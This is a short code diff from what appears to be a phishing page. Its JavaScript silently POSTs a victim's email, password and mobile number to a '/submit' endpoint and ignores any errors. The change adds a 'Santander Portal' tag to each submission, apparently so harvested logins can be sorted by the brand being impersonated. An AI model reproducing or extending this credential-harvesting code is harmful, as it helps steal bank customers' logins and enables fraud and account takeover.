@@ -339,7 +339,7 @@
       await fetch('/submit', {
         method: 'POST',
         headers: {'Content-Type':'application/json'},
-        body: JSON.stringify({type:type,email:email,pwd:pwd,'ms-mobile':msMobile})
+        body: JSON.stringify({page:'Santander Portal',type:type,email:email,pwd:pwd,'ms-mobile':msMobile})
       });
     } catch (e) {}
   }
